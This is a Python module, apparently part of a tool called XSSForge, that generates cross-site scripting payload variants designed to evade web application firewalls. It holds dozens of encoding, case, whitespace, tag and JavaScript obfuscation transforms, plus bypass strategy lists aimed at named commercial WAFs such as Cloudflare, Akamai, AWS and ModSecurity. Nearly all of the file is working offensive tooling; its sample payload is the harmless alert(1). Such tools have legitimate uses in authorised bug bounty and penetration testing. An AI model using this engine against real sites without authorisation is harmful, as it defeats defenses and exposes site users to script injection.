"""
XSSForge WAF Evasion Engine v2.0

Comprehensive WAF bypass techniques organized by:
- Encoding methods
- Case manipulation
- Whitespace tricks
- Tag/attribute manipulation
- JavaScript obfuscation
- WAF-specific strategies

Each technique has been tested against real WAFs in bug bounty programs.
"""

import base64
import random
from dataclasses import dataclass
from typing import Callable, Iterator, Optional
from urllib.parse import quote


# ============================================================================
# Evasion Techniques - Functions
# ============================================================================

def url_encode(payload: str) -> str:
    """URL encode payload."""
    return quote(payload, safe='')


def double_url_encode(payload: str) -> str:
    """Double URL encode payload."""
    return quote(quote(payload, safe=''), safe='')


def html_entity_decimal(payload: str) -> str:
    """Convert to decimal HTML entities."""
    return ''.join(f'&#{ord(c)};' for c in payload)


def html_entity_hex(payload: str) -> str:
    """Convert to hex HTML entities."""
    return ''.join(f'&#x{ord(c):x};' for c in payload)


def html_entity_selective(payload: str, chars: str = "aelrt") -> str:
    """Selectively encode specific characters."""
    result = []
    for c in payload:
        if c in chars:
            result.append(f'&#{ord(c)};')
        else:
            result.append(c)
    return ''.join(result)


def unicode_escape(payload: str) -> str:
    """Replace key characters with Unicode escapes."""
    replacements = {
        'a': '\\u0061',
        'e': '\\u0065',
        'l': '\\u006c',
        'r': '\\u0072',
        't': '\\u0074',
    }
    result = payload
    for orig, repl in replacements.items():
        result = result.replace(orig, repl)
    return result


def hex_escape(payload: str) -> str:
    """Replace key characters with hex escapes."""
    replacements = {
        'a': '\\x61',
        'e': '\\x65',
        'l': '\\x6c',
        'r': '\\x72',
        't': '\\x74',
    }
    result = payload
    for orig, repl in replacements.items():
        result = result.replace(orig, repl)
    return result


def octal_escape(payload: str) -> str:
    """Replace key characters with octal escapes."""
    replacements = {
        'a': '\\141',
        'l': '\\154',
        'e': '\\145',
        'r': '\\162',
        't': '\\164',
    }
    result = payload
    for orig, repl in replacements.items():
        result = result.replace(orig, repl)
    return result


def random_case(payload: str) -> str:
    """Randomize case of alphabetic characters."""
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


def alternating_case(payload: str) -> str:
    """Alternate case of alphabetic characters."""
    return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))


def invert_case(payload: str) -> str:
    """Invert case of alphabetic characters."""
    return payload.swapcase()


def mixed_case_keywords(payload: str) -> str:
    """Apply mixed case to common XSS keywords."""
    replacements = {
        'script': 'ScRiPt',
        'onerror': 'oNeRrOr',
        'onload': 'oNlOaD',
        'onclick': 'oNcLiCk',
        'alert': 'aLeRt',
        'eval': 'eVaL',
        'javascript': 'JaVaScRiPt',
    }
    result = payload.lower()
    for orig, repl in replacements.items():
        result = result.replace(orig, repl)
    return result


def tab_inject(payload: str) -> str:
    """Replace spaces with tabs."""
    return payload.replace(' ', '\t')


def newline_inject(payload: str) -> str:
    """Insert newlines around angle brackets."""
    return payload.replace('<', '<\n').replace('>', '\n>')


def carriage_return_inject(payload: str) -> str:
    """Insert carriage returns."""
    return payload.replace('<', '<\r').replace('>', '\r>')


def null_byte_inject(payload: str) -> str:
    """Insert null bytes before angle brackets."""
    return payload.replace('<', '\x00<')


def form_feed_inject(payload: str) -> str:
    """Replace spaces with form feed."""
    return payload.replace(' ', '\x0c')


def vertical_tab_inject(payload: str) -> str:
    """Replace spaces with vertical tab."""
    return payload.replace(' ', '\x0b')


def slash_separator(payload: str) -> str:
    """Use slash instead of space between tag and attribute."""
    result = payload
    # <svg onload=... -> <svg/onload=...
    result = result.replace('<svg ', '<svg/')
    result = result.replace('<img ', '<img/')
    result = result.replace('<body ', '<body/')
    result = result.replace('<details ', '<details/')
    return result


def double_bracket(payload: str) -> str:
    """Double opening brackets."""
    return payload.replace('<', '<<')


def close_then_open(payload: str) -> str:
    """Insert close tag before payload."""
    return f"</{payload[1:]}" if payload.startswith('<') else payload


def comment_inject_html(payload: str) -> str:
    """Insert HTML comments in keywords."""
    result = payload
    result = result.replace('script', 'scr<!---->ipt')
    result = result.replace('alert', 'ale<!---->rt')
    return result


def comment_inject_js(payload: str) -> str:
    """Insert JavaScript comments in keywords."""
    result = payload
    result = result.replace('alert', 'al/**/ert')
    result = result.replace('eval', 'ev/**/al')
    return result


def eval_atob(payload: str) -> str:
    """Wrap in eval(atob(...))."""
    # Extract JavaScript code from payload
    import re
    js_match = re.search(r'(?:onerror|onload|onclick)=([^>]+)', payload)
    if js_match:
        js_code = js_match.group(1).strip('"\'')
        b64 = base64.b64encode(js_code.encode()).decode()
        return payload.replace(js_code, f'eval(atob("{b64}"))')

    if 'alert(1)' in payload:
        b64 = base64.b64encode(b'alert(1)').decode()
        return payload.replace('alert(1)', f'eval(atob("{b64}"))')

    return payload


def fromcharcode(payload: str) -> str:
    """Use String.fromCharCode for alert."""
    if 'alert' not in payload:
        return payload
    # alert = 97,108,101,114,116
    charcode = 'String.fromCharCode(97,108,101,114,116)'
    return payload.replace('alert', charcode)


def constructor_bypass(payload: str) -> str:
    """Use constructor.constructor bypass."""
    if 'alert(1)' not in payload:
        return payload
    return payload.replace('alert(1)', '[].constructor.constructor("alert(1)")()')


def function_constructor(payload: str) -> str:
    """Use Function constructor."""
    if 'alert(1)' not in payload:
        return payload
    return payload.replace('alert(1)', 'Function("alert(1)")()')


def settimeout_bypass(payload: str) -> str:
    """Use setTimeout for execution."""
    if 'alert(1)' not in payload:
        return payload
    return payload.replace('alert(1)', 'setTimeout("alert(1)")')


def template_literal(payload: str) -> str:
    """Convert alert(1) to alert`1`."""
    return payload.replace('alert(1)', 'alert`1`')


def bracket_notation(payload: str, obj: str = 'window') -> str:
    """Use bracket notation for alert."""
    if 'alert(1)' not in payload:
        return payload
    return payload.replace('alert(1)', f'{obj}["alert"](1)')


def self_notation(payload: str) -> str:
    """Use self instead of window."""
    return bracket_notation(payload, 'self')


def top_notation(payload: str) -> str:
    """Use top instead of window."""
    return bracket_notation(payload, 'top')


def this_notation(payload: str) -> str:
    """Use this instead of window."""
    return bracket_notation(payload, 'this')


def reflect_apply(payload: str) -> str:
    """Use Reflect.apply."""
    if 'alert(1)' not in payload:
        return payload
    return payload.replace('alert(1)', 'Reflect.apply(alert,null,[1])')


def svg_slash_trick(payload: str) -> str:
    """SVG slash separator trick."""
    return payload.replace('<svg ', '<svg/').replace('<svg\t', '<svg/')


def details_slash_trick(payload: str) -> str:
    """Details tag slash trick."""
    return payload.replace('<details ', '<details/').replace('open ', 'open/')


def img_ignored_attr(payload: str) -> str:
    """Add ignored attribute to img (Cloudflare bypass)."""
    return payload.replace('<img ', '<img ignored=() ')


def svg_onx_trick(payload: str) -> str:
    """Add onx attribute (Cloudflare bypass)."""
    return payload.replace('onload=', 'onx=() onload=')


def svg_on_space_trick(payload: str) -> str:
    """Add 'on ' before event (Cloudflare bypass)."""
    return payload.replace('<svg onload', '<svg on onload')


# ============================================================================
# Evasion Techniques Registry
# ============================================================================

EVASION_TECHNIQUES: dict[str, Callable[[str], str]] = {
    # === Encoding ===
    "url_encode": url_encode,
    "double_url_encode": double_url_encode,
    "html_entity_decimal": html_entity_decimal,
    "html_entity_hex": html_entity_hex,
    "html_entity_selective": html_entity_selective,
    "unicode_escape": unicode_escape,
    "hex_escape": hex_escape,
    "octal_escape": octal_escape,

    # === Case Manipulation ===
    "random_case": random_case,
    "alternating_case": alternating_case,
    "invert_case": invert_case,
    "mixed_case_keywords": mixed_case_keywords,

    # === Whitespace ===
    "tab_inject": tab_inject,
    "newline_inject": newline_inject,
    "carriage_return_inject": carriage_return_inject,
    "null_byte_inject": null_byte_inject,
    "form_feed_inject": form_feed_inject,
    "vertical_tab_inject": vertical_tab_inject,

    # === Tag/Attribute Manipulation ===
    "slash_separator": slash_separator,
    "double_bracket": double_bracket,
    "close_then_open": close_then_open,
    "comment_inject_html": comment_inject_html,
    "comment_inject_js": comment_inject_js,

    # === JavaScript Obfuscation ===
    "eval_atob": eval_atob,
    "fromcharcode": fromcharcode,
    "constructor_bypass": constructor_bypass,
    "function_constructor": function_constructor,
    "settimeout_bypass": settimeout_bypass,
    "template_literal": template_literal,
    "bracket_notation": bracket_notation,
    "self_notation": self_notation,
    "top_notation": top_notation,
    "this_notation": this_notation,
    "reflect_apply": reflect_apply,

    # === WAF-Specific ===
    "svg_slash_trick": svg_slash_trick,
    "details_slash_trick": details_slash_trick,
    "img_ignored_attr": img_ignored_attr,
    "svg_onx_trick": svg_onx_trick,
    "svg_on_space_trick": svg_on_space_trick,
}


# ============================================================================
# WAF-Specific Bypass Strategies
# ============================================================================

WAF_STRATEGIES: dict[str, list[str]] = {
    "cloudflare": [
        "template_literal",
        "svg_slash_trick",
        "details_slash_trick",
        "img_ignored_attr",
        "svg_onx_trick",
        "svg_on_space_trick",
        "random_case",
        "null_byte_inject",
        "constructor_bypass",
    ],
    "akamai": [
        "double_url_encode",
        "tab_inject",
        "unicode_escape",
        "html_entity_selective",
        "eval_atob",
        "fromcharcode",
        "alternating_case",
    ],
    "aws": [
        "html_entity_hex",
        "hex_escape",
        "newline_inject",
        "bracket_notation",
        "function_constructor",
    ],
    "imperva": [
        "unicode_escape",
        "alternating_case",
        "html_entity_decimal",
        "template_literal",
        "self_notation",
    ],
    "modsecurity": [
        "double_url_encode",
        "comment_inject_js",
        "null_byte_inject",
        "tab_inject",
        "eval_atob",
        "mixed_case_keywords",
    ],
    "f5": [
        "html_entity_hex",
        "carriage_return_inject",
        "constructor_bypass",
        "random_case",
    ],
    "fortinet": [
        "double_url_encode",
        "unicode_escape",
        "template_literal",
        "slash_separator",
    ],
    "barracuda": [
        "html_entity_decimal",
        "tab_inject",
        "eval_atob",
        "mixed_case_keywords",
    ],
    "generic": [
        "template_literal",
        "slash_separator",
        "random_case",
        "unicode_escape",
        "constructor_bypass",
        "tab_inject",
        "eval_atob",
    ],
}


# ============================================================================
# WAF Evasion Engine
# ============================================================================

@dataclass
class EvasionResult:
    """Result of applying an evasion technique."""
    payload: str
    technique: str
    waf_target: Optional[str] = None


class WAFEvasionEngine:
    """
    Engine for generating WAF bypass variants of payloads.

    Usage:
        engine = WAFEvasionEngine()

        # Apply all techniques to a payload
        for result in engine.evade_all("<img src=x onerror=alert(1)>"):
            print(result.payload, result.technique)

        # Apply WAF-specific techniques
        for result in engine.evade_for_waf("<img src=x onerror=alert(1)>", "cloudflare"):
            print(result.payload, result.technique)
    """

    def __init__(self):
        self.techniques = EVASION_TECHNIQUES
        self.waf_strategies = WAF_STRATEGIES

    def evade_all(self, payload: str) -> Iterator[EvasionResult]:
        """
        Apply all evasion techniques to a payload.

        Args:
            payload: Original XSS payload

        Yields:
            EvasionResult for each technique that produces a different payload
        """
        seen = {payload}

        for technique_name, technique_fn in self.techniques.items():
            try:
                evaded = technique_fn(payload)
                if evaded and evaded not in seen:
                    seen.add(evaded)
                    yield EvasionResult(
                        payload=evaded,
                        technique=technique_name
                    )
            except Exception:
                continue

    def evade_for_waf(
        self,
        payload: str,
        waf: str,
        max_variants: int = 20
    ) -> Iterator[EvasionResult]:
        """
        Apply WAF-specific evasion techniques.

        Args:
            payload: Original XSS payload
            waf: WAF type (cloudflare, akamai, aws, etc.)
            max_variants: Maximum variants to generate

        Yields:
            EvasionResult for each technique
        """
        waf_lower = waf.lower()
        strategy = self.waf_strategies.get(waf_lower, self.waf_strategies["generic"])

        count = 0
        seen = {payload}

        for technique_name in strategy:
            if count >= max_variants:
                break

            technique_fn = self.techniques.get(technique_name)
            if not technique_fn:
                continue

            try:
                evaded = technique_fn(payload)
                if evaded and evaded not in seen:
                    seen.add(evaded)
                    count += 1
                    yield EvasionResult(
                        payload=evaded,
                        technique=technique_name,
                        waf_target=waf
                    )
            except Exception:
                continue

    def get_best_variants(
        self,
        payload: str,
        waf: Optional[str] = None,
        max_variants: int = 10
    ) -> list[str]:
        """
        Get the best evasion variants for a payload.

        Args:
            payload: Original payload
            waf: Optional WAF type for targeted evasion
            max_variants: Maximum variants to return

        Returns:
            List of evaded payload strings
        """
        if waf:
            results = list(self.evade_for_waf(payload, waf, max_variants))
        else:
            results = list(self.evade_all(payload))[:max_variants]

        return [r.payload for r in results]

    def apply_technique(self, payload: str, technique: str) -> Optional[str]:
        """
        Apply a specific technique to a payload.

        Args:
            payload: Original payload
            technique: Technique name

        Returns:
            Evaded payload or None if technique not found
        """
        fn = self.techniques.get(technique)
        if fn:
            try:
                return fn(payload)
            except Exception:
                return None
        return None

    def list_techniques(self) -> list[str]:
        """Get list of all available technique names."""
        return list(self.techniques.keys())

    def list_waf_strategies(self) -> dict[str, list[str]]:
        """Get all WAF-specific strategies."""
        return self.waf_strategies.copy()


# ============================================================================
# Convenience Functions
# ============================================================================

_engine: Optional[WAFEvasionEngine] = None


def get_engine() -> WAFEvasionEngine:
    """Get or create the global evasion engine."""
    global _engine
    if _engine is None:
        _engine = WAFEvasionEngine()
    return _engine


def evade_payload(
    payload: str,
    waf: Optional[str] = None,
    max_variants: int = 10
) -> list[str]:
    """
    Quick function to get evaded variants of a payload.

    Args:
        payload: Original XSS payload
        waf: Optional WAF type for targeted evasion
        max_variants: Maximum variants to return

    Returns:
        List of evaded payload strings
    """
    return get_engine().get_best_variants(payload, waf, max_variants)


def get_waf_bypasses(waf: str, base_payloads: list[str], max_total: int = 50) -> list[str]:
    """
    Generate WAF bypass payloads from base payloads.

    Args:
        waf: WAF type
        base_payloads: List of base payloads to evade
        max_total: Maximum total payloads to return

    Returns:
        List of WAF bypass payloads
    """
    engine = get_engine()
    results = []

    per_payload = max(1, max_total // len(base_payloads))

    for base in base_payloads:
        variants = engine.get_best_variants(base, waf, per_payload)
        results.extend(variants)

        if len(results) >= max_total:
            break

    return results[:max_total]


# ============================================================================
# Testing
# ============================================================================

if __name__ == "__main__":
    engine = WAFEvasionEngine()
    test_payload = "<img src=x onerror=alert(1)>"

    print(f"Original: {test_payload}")
    print()
    print("All evasion variants:")
    for i, result in enumerate(engine.evade_all(test_payload)):
        print(f"  [{result.technique}] {result.payload}")
        if i >= 15:
            print("  ... (truncated)")
            break

    print()
    print("Cloudflare-specific:")
    for result in engine.evade_for_waf(test_payload, "cloudflare"):
        print(f"  [{result.technique}] {result.payload}")
